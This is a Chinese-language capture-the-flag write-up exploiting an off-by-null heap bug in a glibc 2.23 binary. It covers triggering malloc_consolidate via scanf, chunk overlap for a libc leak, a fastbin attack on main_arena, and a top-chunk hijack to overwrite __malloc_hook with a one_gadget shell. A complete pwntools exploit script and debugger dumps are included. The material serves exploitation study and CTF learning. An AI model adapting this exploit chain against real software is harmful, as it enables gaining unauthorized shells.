[TOC]
# checksec 

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

# 溢出点
存在offbynull ，索引[0,5],限制了size[0,0x58],极其少的条件，利用变得更加巧妙。

## scanf 触发malloc_consolidate
由于size 的限制，只能申请到fastbin ， 使用off by null，直接就把整个size给覆盖了，这样free 会直接crash，没有unsorted bin无法泄露libc地址，而要想将chunk放入unsorted bin，我们需要触发malloc_consolidate合并fastbin并且放入unsorted bin, malloc_consolidate 的触发条件，当top_chunk 空间不足时，或者申请了largebin触发malloc_consolidate

这里使用scanf的缓冲机制，当scanf缓冲区不够用时，就会malloc更大的chunk来充当新的缓冲区，输入大于0x400时，便会申请大于0x400的chunk来当缓冲区，触发malloc_consolidate

```
for i in range(6):
    add(0x58, i, 'n')

for i in range(5):
    remove(i)

add(0x28, 4, 'n')
sh.sendlineafter('choice >> n', '0' * 0x400)
```
这里我用peda 进复现时bins[58]和bins[59],bins 使用双向链表刚好对应bins[0x1e]
```
gdb-peda$ p main_arena .bins[59]
$28 = (mchunkptr) 0x55f492933000
gdb-peda$ p main_arena .bins[58]
$29 = (mchunkptr) 0x55f492933000
```

pwndbg 显示结果
```
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x1e0: 0x5649e1bc4000 —▸ 0x7fa5c69cad48 (main_arena+552) ◂— 0x5649e1bc4000
largebins
empty
```
这里的chunk被放入smallbin是因为申请0x400的chunk时
## 利用malloc_consolidate 巧妙unlink（重点+难点）
虽然有unsorted bin可以用了，但是我们并没有一个size为0x100的chunk可以free，根据size的限制，我们也不可能申请到，那么该如何进行unlink呢，这里就要用到malloc_consolidate一个巧妙的地方。
```
static void malloc_consolidate(mstate av)
{
  mfastbinptr*    fb;                 /* current fastbin being consolidated */
  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */
  mchunkptr       p;                  /* current chunk being consolidated */
  mchunkptr       nextp;              /* next chunk to consolidate */
  mchunkptr       unsorted_bin;       /* bin header */
  mchunkptr       first_unsorted;     /* chunk to link to */

...

  /*
    If max_fast is 0, we know that av hasn't
    yet been initialized, in which case do so below
  */

  if (get_max_fast () != 0) {
    clear_fastchunks(av);

    unsorted_bin = unsorted_chunks(av);

    /*
      Remove each chunk from fast bin and consolidate it, placing it
      then in unsorted bin. Among other reasons for doing this,
      placing in unsorted bin avoids needing to calculate actual bins
      until malloc is sure that chunks aren't immediately going to be
      reused anyway.
    */

    maxfb = &fastbin (av, NFASTBINS - 1);
    fb = &fastbin (av, 0);
    do {
      p = atomic_exchange_acq (fb, 0);

      ...

    } while (fb++ != maxfb);
  }
  else {
    malloc_init_state(av);
    check_malloc_state(av);
  }
}
```
可以看到malloc_consolidate操作是从小的fastbin开始，然后逐渐转向大的，使他们都合并成unsorted bin，如果我们先把size的尾巴踩掉，使得该unsorted bin和后面的chunk断片，然后在申请一块较小的chunk，那么malloc_consolidate时，这块较小的chunk，会优先放入unsorted bin中，然后在合并后面断片的chunk时，就会直接unlink进行合并，那么我们就可以利用中间的chunk来进行 chunk overlap 的操作了。

> 
> Q&A:
> 1. 好的，这里为什么是从小到大没有看出来，后面看来还是要深入阅读一下glibc源码，
> 



```
add(0x58, 0, 'a' * 0x50 + p64(0x61))  //bp0
add(0x18, 1, '\n') 
add(0x50, 2, '\n')
add(0x48, 3, '\n')
remove(1) //bp1 分配3个chunk 以后覆盖的unsorted bin 还剩余0x30 实际上还有剩余0xc0 中间断片0x80
remove(5)  //top chunk = 0x55d8d74f1270
add(0x48, 5, '\n') //这里问题，剩余空间0x30 不足来分配0x50的空间。，unsorted bin空间不足从topchunk分配， 并且将0x30 的unsorted bin放入small bin
sh.sendlineafter('choice >> \n', '0' * 0x400) //fastbin 通过malloc_consolidate 合并一个size=0x1e1 的chunk，但是fastbin仅有0x61 和0x60，复现关注idx = 1 和 5 中间的chunk。
```

> 细节分析
> 1. bp1 查看已分配的堆环境(关注0x90的断片情况)
> ```
> 0x55f4929320a0:	0x000055f492933010(size = 0x61)	0x0000000000000058
> 0x55f4929320b0:	0x000055f492933070	0x0000000000000018
> 0x55f4929320c0:	0x000055f492933090	0x0000000000000050
> 0x55f4929320d0:	0x000055f4929330f0	0x0000000000000000
> 0x55f4929320e0:	0x000055f492933250	0x0000000000000028
> 0x55f4929320f0:	0x000055f4929331f0(size = 0x60)	0x0000000000000058
> ```
> 断片
> ```
> 0x55d8d74f1130:	0x00007f6a2a36bb78	0x0000000000000031
> 0x55d8d74f1140:	0x00007f6a2a36bb78	0x00007f6a2a36bb78
> 0x55d8d74f1150:	0x0000000000000000	0x0000000000000000
> 0x55d8d74f1160:	0x0000000000000030	0x0000000000000000(**)
> ```
> idx = 5
> ```
> 0x55d8d74f11e0:	0x0000000000000180	0x0000000000000060
> 0x55d8d74f11f0:	0x000000000000000a	0x0000000000000000
> 0x55d8d74f1200:	0x0000000000000000	0x0000000000000000
> ```
> remove(1),remove(5)以后
> ```
> gdb-peda$ p main_arena .fastbinsY 
> $4 = {0x55d8d74f1060, 0x0, 0x0, 0x0, 0x55d8d74f11e0, 0x0, 0x0, 0x0, 0x0, 0x0}
> ```
> idx= 1
> ```
> gdb-peda$ x /20gx 0x55d8d74f1060
> 0x55d8d74f1060:	0x0000000000000061	0x0000000000000021
> ```
> idx=5
> ```
> gdb-peda$ x /20gx 0x55d8d74f11e0
> 0x55d8d74f11e0:	0x0000000000000180(就是因为断片所以mallo时填下一个chunk的pre_inuse 字段没有写到这个位置)	0x0000000000000060 (这里 prev_size 包含到bp0 覆盖unosortedebin后的第一个chunk)
> ```
> 此时触发mallo_consolidate 将fastbin 合并成unsorted bin ，由于idx = 5 ，pre_inues = 0 ，0x55d8d74f1060 到 0x55d8d74f1240,  合并放入small bin。
## chunk overlap 
```
add(0x18, 0, '\n') //bp2
add(0x18, 1, '\n') //此时idx = 2 存放0x000055d8d74f1090地址，malloc(0x18) ,将main+88 写到0x55d8d74f1090上泄露libc
show(2)
sh.recvuntil('flowers : ')
result = sh.recvuntil('1.', drop=True)
main_arena_addr = u64(result.ljust(8, '')) - 88
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))
```

> bp1
> Q&A：
> 
> add(0x18 , 0 , '\n') 为什么把0x30的small bin 取出了？ 分配规则应该为分配0x20 的chunk。


## 劫持top_chunk
还是因为size > 0 && size <= 0x58的限制，我们没有办法使用正常的0x7fsize来劫持__malloc_hook，这时就需要我们想出新的办法来劫持hook。

由于fastbin和top_chunk邻近，而且fastbin一般都是0x56....（开了PIE）之类的，那么size > 0 && size <= 0x58的限制刚好可以申请到这种size，所以我们利用fastbin的地址充当size，然后malloc出 main_arena，再劫持 top_chunk 。
```
remove(3) idx = 3 释放到fastbinY size = 0x51
remove(4) #idx = 4 释放到fastbinY size = 0x30
#gdb-peda$ p main_arena.fastbinsY 
#$15 = {0x0, 0x555555757240, 0x0, 0x5555557570e0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
#unsorted bin 0x555555757080 size = 0x1c1

add(0x38, 3, '\n') #从unsortd bin 分配，
add(0x50, 4, 'a' * 0x10 + p64(0) + p64(0x51) + p64(main_arena_addr + 0xd)) #fast bin attack 分配到fastbin
add(0x48, 1, '\n')
```

## 劫持hook
之前的步骤已经完成分配一块0x50 的空间到fastbinY 可以控制top chunk
```
add(0x48, 0, '\x00' * 0x3b + p64(main_arena_addr - 0x28)) # bp 3 劫持top chunk 
add(0x50, 2, '\n') #
add(0x50, 2, '\n') #
add(0x50, 2, '\n') #用完unsorted bin 使用topchunk
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
# 分配到malloc_hook
add(0x50, 2, p64(libc_addr + 0xf1147) + p64(libc_addr + libc.symbols['realloc'] + 20))

sh.sendlineafter('choice >> n', '1')
sh.sendlineafter('Size : ', str(1))
sh.sendlineafter('index: ', str(1))

sh.interactive()
```
> bp3
>
> 关闭地址话随机处理出现SIGSEGV，
> ```
> 0x00007ffff7a911e0 in __GI___libc_malloc (bytes=0x48) at malloc.c:2926
> warning: Source file is more recent than executable.
> 2926	  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
> gdb-peda$ p victim
> $4 = (void *) 0x7ffff7dd1b3d <main_arena+29>
> ```
> 提示错误出现在 malloc.c 2969行
> ```
> assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
>           ar_ptr == arena_for_chunk (mem2chunk (victim)));
> ```
> 当size & 0x2 == true 时绕过，即size = 0x56
> 
> 此时堆结构size = 0x55 
> ```
> gdb-peda$ x /20gx 0x7ffff7dd1b2d
> 0x7ffff7dd1b2d <main_arena+13>:	0x5555757240000000	0x0000000000000055
> 0x7ffff7dd1b3d <main_arena+29>:	0x1b2d000000000000	0x0000000000fff7dd
> ```
# 完整exp
```
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

context.arch = 'amd64'
context.log_level = 'debug'
execve_file = './pwn'
sh = process(execve_file)
# sh = remote('152.136.21.148', 48138)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')

def add(size, index, content):
    sh.sendlineafter('choice >> \n', '1')
    sh.sendlineafter('Size : ', str(size))
    sh.sendlineafter('index: ', str(index))
    sh.sendafter('name:\n', content)

def remove(index):
    sh.sendlineafter('choice >> \n', '2')
    sh.sendlineafter('idx :', str(index))

def show(index):
    sh.sendlineafter('choice >> \n', '3')
    sh.sendlineafter('idx :', str(index))

for i in range(6):
    add(0x58, i, '\n')

for i in range(5):
    remove(i)

add(0x28, 4, '\n')

sh.sendlineafter('choice >> \n', '0' * 0x400)

add(0x58, 0, 'a' * 0x50 + p64(0x61))
add(0x18, 1, '\n')
add(0x50, 2, '\n')
add(0x48, 3, '\n')
remove(1)
remove(5)
add(0x48, 5, '\n')
sh.sendlineafter('choice >> \n', '0' * 0x400)

add(0x18, 0, '\n')
add(0x18, 1, '\n')
show(2)
sh.recvuntil('flowers : ')
result = sh.recvuntil('1.', drop=True)
main_arena_addr = u64(result.ljust(8, '\x00')) - 88
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))

remove(3)
remove(4)

add(0x38, 3, '\n')
add(0x50, 4, 'a'*0x10 + p64(0) + p64(0x51) + p64(main_arena_addr+0xd))

add(0x48, 1, '\n')

add(0x48, 0, '\x00' * 0x3b + p64(main_arena_addr - 0x28))
add(0x50, 2, '\n')
add(0x50, 2, '\n')
add(0x50, 2, '\n')
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
add(0x50, 2, p64(libc_addr + 0xf1147) + p64(libc_addr + libc.symbols['realloc'] + 20))

sh.sendlineafter('choice >> \n', '1')
sh.sendlineafter('Size : ', str(1))
sh.sendlineafter('index: ', str(1))

sh.interactive()

```

# reference
[ex-origin ](https://www.anquanke.com/post/id/186185)

[jiangnan's blog](https://blog.csdn.net/qq_41453285/article/details/97613588)
